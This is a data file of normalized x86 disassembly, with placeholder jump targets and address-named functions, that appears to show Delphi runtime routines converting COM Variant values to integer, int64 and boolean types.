mov edx eax
mov eax esi
call sub_41344c
jmp r-xdata
mov eax ebx
call sub_41069c
push edx
push eax
mov eax esi
call sub_4134ac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f690
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f6dc
jmp r-xdata
mov dx 0x101
call sub_40e9e8
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f220
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f7a8
xor edx edx
mov ax 0x1
call sub_40e9e8
jmp r-xdata
sub_40fa40
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fae3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c60
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404204
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_40834c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40faea
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_40465c
retn
mov eax ebx
call sub_410c98
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ee7c
jmp r-xdata
sub_40faf4
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ee7c
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fb30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fb84
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f548
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fbd8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb8b
lea eax [ ebp - 0x14 ]
call sub_40f220
retn
sub_40fb94
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fbd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fff9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fc0b ]
mov eax [ ebp - 0x4 ]
call sub_40fa40
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa40
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fbd8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40faf4
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb30
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e9e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fb94
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40faf4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40faf4
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fe2f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa40
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fbd8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403124
sub_410028
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e9e8
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4100b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fbd8
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403124
sub_4100d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e9e8
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41015b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fbd8
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403124
sub_410180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410254
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fbd8
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4101a6 ]
jmp [ eax * 4 + jump_table_4101b8 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403124
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e9e8
sub_410278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_41032d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fbd8
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41029a ]
jmp [ eax * 4 + jump_table_4102ad ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403124
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e9e8
sub_410350
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410415
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41069c
test edx edx
je r-xdata
mov al [ eax + lookup_table_410376 ]
jmp [ eax * 4 + jump_table_41038a ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403124
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e9e8
sub_410438
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_4029f0
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ee7c
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410c98
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4104e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4105d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c60
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404204
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40836c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105d9
lea eax [ ebp - 0x1c ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_40465c
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_4029f0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ee7c
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410c98
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_4105e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41063b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f548
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41069c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410642
lea eax [ ebp - 0x18 ]
call sub_40f220
retn
sub_410650
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41069c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410aa8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4106cf ]
mov eax [ ebp - 0x4 ]
call sub_4104e4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4104e4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41069c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410438
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4105e4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e9e8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410650
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410438
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410438
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4108f3 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_4029f0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4104e4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41069c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410ae0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410b97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c60
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404204
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408458
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b9e
lea eax [ ebp - 0x10 ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_40465c
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ee7c
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ee7c
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410ba8
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40ee7c
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410be8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410c3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f548
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410c98
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c43
lea eax [ ebp - 0x11 ]
call sub_40f220
retn
sub_410c4c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410c98
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410cb2 ]
mov eax ebx
call sub_410ae0
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
